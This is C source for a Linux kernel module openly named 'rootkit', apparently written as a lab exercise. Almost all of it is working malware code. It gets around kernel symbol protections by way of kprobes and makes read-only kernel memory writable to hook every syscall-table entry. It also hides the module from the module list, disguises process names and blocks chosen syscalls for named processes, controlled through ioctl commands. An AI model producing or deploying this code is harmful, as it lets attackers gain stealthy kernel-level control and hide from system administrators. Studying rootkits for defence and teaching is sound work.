#include "rootkit.h"

#include <asm/syscall.h>
#include <asm/pgtable.h>        // PAGE_KERNEL, PAGE_KERNEL_RO
#include <linux/cdev.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/kprobes.h>
#include <linux/mm.h>           // __pa_symbol
#include <linux/module.h>
#include <linux/reboot.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>
#include <linux/version.h>

#define OURMODNAME "rootkit"

// store original syscall handler with type sys_call_t
typedef asmlinkage long (*sys_call_t)(const struct pt_regs *);

typedef struct filter {
    int syscall_nr;             // Syscall number
    char comm[TASK_FILTER_LEN]; // Process name
    struct list_head list;      // circular list
} filter;

MODULE_AUTHOR("FOOBAR");
MODULE_DESCRIPTION("FOOBAR");
MODULE_LICENSE("Dual MIT/GPL");
MODULE_VERSION("0.1");

// The rootkit module should be visible by default.
static bool module_hidden = false;

/* Kprobe */
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
struct list_head *modules = NULL;
unsigned long (*__kallsyms_lookup_name)(const char *);
static unsigned long *__sys_call_table = NULL;
static sys_call_t orig_sys_call[NR_syscalls];

void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
unsigned long start_rodata, init_begin;

static LIST_HEAD(filter_list);

static int rootkit_open(struct inode *inode, struct file *filp) {
    printk(KERN_INFO "%s\n", __func__);
    return 0;
}

static int rootkit_release(struct inode *inode, struct file *filp) {
    printk(KERN_INFO "%s\n", __func__);
    return 0;
}

static void toggle_module_visibility(void) {
    if (!module_hidden) {
        try_module_get(THIS_MODULE); // Prevent unloading
        // Hide module: remove from list
        list_del(&THIS_MODULE->list);
        module_hidden = true;
        
        printk(KERN_INFO "Module hidden\n");
    } else {
        list_add_tail(&THIS_MODULE->list, modules);
        module_hidden = false;
        module_put(THIS_MODULE); // Balance reference count

        printk(KERN_INFO "Module unhidden\n");
    }
}

static void masquerade_proc(struct masq_proc *proc) {
    struct task_struct *task;
    char *new_name = proc->new_name;
    char *orig_name = proc->orig_name;

    // new name must be shorter than original name
    if (strnlen(new_name, MASQ_LEN) >= strnlen(orig_name, MASQ_LEN)) {
        printk(KERN_WARNING "New name must be shorter than original name\n");
        return;
    }

    // iterate over all processes and masquerade name if possible
    for_each_process(task) {
        if (strcmp(task->comm, orig_name) == 0) {
            // use strncpy instead of strcpy to avoid overflow
            strncpy(task->comm, new_name, TASK_COMM_LEN - 1);
            task->comm[TASK_COMM_LEN - 1] = '\0';
        }
    }
}

static int get_kallsyms_lookup_name(void) {
    int ret = register_kprobe(&kp);
    if (ret < 0) {
        pr_err("register_kprobe failed, returned %d\n", ret);
        return ret;
    }
    __kallsyms_lookup_name = (void*)kp.addr;
    unregister_kprobe(&kp);
    return 0;
}

void resolve_symbol_addr(void) {
    modules = (struct list_head *)__kallsyms_lookup_name("modules");
    __sys_call_table = (unsigned long *)__kallsyms_lookup_name("sys_call_table");
    update_mapping_prot = (void *)__kallsyms_lookup_name("update_mapping_prot");
    start_rodata = (unsigned long)__kallsyms_lookup_name("__start_rodata");
    init_begin = (unsigned long)__kallsyms_lookup_name("__init_begin");
}

static inline void __mark_rodata_wr(void) {
    unsigned long section_size = init_begin - start_rodata;
    update_mapping_prot(__pa_symbol(start_rodata), start_rodata, section_size,
                        PAGE_KERNEL);
}

static inline void __mark_rodata_ro(void) {
    unsigned long section_size = init_begin - start_rodata;
    update_mapping_prot(__pa_symbol(start_rodata), start_rodata, section_size,
                        PAGE_KERNEL_RO);
}

static asmlinkage long hooked_syscall(const struct pt_regs *regs) {
    struct filter *cur;
    struct task_struct *current_t;
    u64 syscall_nr;

    current_t = current;
    syscall_nr = regs->regs[8];
    list_for_each_entry(cur, &filter_list, list) {
        if (syscall_nr == cur->syscall_nr && strcmp(cur->comm, current_t->comm) == 0) {
            return -EPERM;
        }
    }
    return orig_sys_call[syscall_nr](regs);
}

static int set_syscall_hook(void) {
    __mark_rodata_wr();

    for (int i = 0; i < NR_syscalls; i++) {
        if (i == __NR_delete_module) // do NOT modify delete_module()
            continue;
        orig_sys_call[i] = (sys_call_t)__sys_call_table[i];
        __sys_call_table[i] = (unsigned long) &hooked_syscall;
    }

    __mark_rodata_ro();
    return 0;
}


static int remove_syscall_hook(void) {
    __mark_rodata_wr();

    for (int i = 0; i < NR_syscalls; i++) {
        if (i == __NR_delete_module) // do NOT modify delete_module()
            continue;
        __sys_call_table[i] = (unsigned long) orig_sys_call[i];
    }

    __mark_rodata_ro();
    return 0;
}

static int add_filter(struct filter_info *finfo) {
    int ret = 0;
    struct filter *filter;
    struct filter *cur;

    pr_info("%s: syscall_nr=%d, comm=%s\n", __func__, finfo->syscall_nr, finfo->comm);

    // check repeated filter
    list_for_each_entry(cur, &filter_list, list) {
        if (finfo->syscall_nr == cur->syscall_nr && strcmp(cur->comm, finfo->comm) == 0) {
            pr_err("add_filter: repeated filter\n");
            ret = -EINVAL; // error for identical elements
            return ret;
        }
    }

    filter = kmalloc(sizeof(struct filter), GFP_KERNEL);
    if (!filter) {
        pr_err("kmalloc: failed to allocate memory\n");
        ret = -ENOMEM;
        return ret;
    }

    strcpy(filter->comm, finfo->comm);
    filter->syscall_nr = finfo->syscall_nr;
    list_add_tail(&filter->list, &filter_list);

    return ret;
}

static int remove_filter(struct filter_info *finfo) {
    struct filter *cur;

    pr_info("%s: syscall_nr=%d, comm=%s\n", __func__, finfo->syscall_nr, finfo->comm);

    list_for_each_entry(cur, &filter_list, list) {
        if (finfo->syscall_nr == cur->syscall_nr && strcmp(cur->comm, finfo->comm) == 0) {
            list_del(&cur->list);
            kfree(cur);
            return 0;
        }
    }

    pr_err("%s: syscall_nr=%d, comm=%s not found\n", __func__, finfo->syscall_nr, finfo->comm);
    return -EFAULT;
}

static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
                          unsigned long arg) {
    long ret = 0;
    struct filter_info finfo;

    printk(KERN_INFO "%s\n", __func__);

    switch (ioctl) {
    case IOCTL_MOD_HIDE:
        toggle_module_visibility();
        break;
    case IOCTL_MOD_MASQ:
        struct masq_proc_req req;
        struct masq_proc *procs;

        // copy request from user space
        if (copy_from_user(&req, (void *)arg, sizeof(req))) {
            ret = -EFAULT;
            break;
        }

        // allocate memory for procs
        procs = kmalloc(req.len * sizeof(struct masq_proc), GFP_KERNEL);
        if (!procs) {
            ret = -ENOMEM;
            break;
        }

        // copy procs from user space
        if (copy_from_user(procs, req.list, req.len * sizeof(struct masq_proc))) {
            kfree(procs);
            ret = -EFAULT;
            break;
        }

        // masquerade each process
        for (int i = 0; i < req.len; i++) {
            masquerade_proc(&procs[i]);
        }

        kfree(procs);
        break;
    case IOCTL_ADD_FILTER:
        if (copy_from_user(&finfo, (void *)arg, sizeof(struct filter_info))) {
            ret = -EFAULT;
            break;
        }
        ret = add_filter(&finfo);
        break;
    case IOCTL_REMOVE_FILTER:
        if (copy_from_user(&finfo, (void *)arg, sizeof(struct filter_info))) {
            ret = -EFAULT;
            break;
        }
        ret = remove_filter(&finfo);
        break;
    default:
        ret = -EINVAL;
    }

    return ret;
}

static int major;
static struct class *cls;

struct file_operations fops = {
    open : rootkit_open,
    unlocked_ioctl : rootkit_ioctl,
    release : rootkit_release,
    owner : THIS_MODULE
};

static int __init rootkit_init(void) {
    if (get_kallsyms_lookup_name()) {
        pr_err("failed to get kallsyms_lookup_name\n");
        return -EFAULT;
    }
    resolve_symbol_addr();
    if (set_syscall_hook()) {
        pr_err("failed to set syscall hook\n");
        return -EFAULT;
    }

    major = register_chrdev(0, OURMODNAME, &fops);
    if (major < 0) {
        pr_err("Registering char device failed with %d\n", major);
        return major;
    }

    pr_info("The module was assigned major number %d.\n", major);
    cls = class_create(THIS_MODULE, OURMODNAME);
    device_create(cls, NULL, MKDEV(major, 0), NULL, OURMODNAME);
    pr_info("Device created on /dev/%s\n", OURMODNAME);

    return 0;
}

static void __exit rootkit_exit(void) {
    struct filter *cur, *tmp;
    
    // unhook syscall
    remove_syscall_hook();
    pr_info("removed syscall hooks\n");

    // cleanup syscall filter list
    list_for_each_entry_safe(cur, tmp, &filter_list, list) {
        list_del(&cur->list);
        pr_info("removed filter syscall_nr=%d, comm=%s\n", cur->syscall_nr, cur->comm);
        kfree(cur);
    }
    pr_info("removed filter list\n");

    pr_info("%s: removed\n", OURMODNAME);
    device_destroy(cls, MKDEV(major, 0));
    class_destroy(cls);
    unregister_chrdev(major, OURMODNAME);
}

module_init(rootkit_init);
module_exit(rootkit_exit);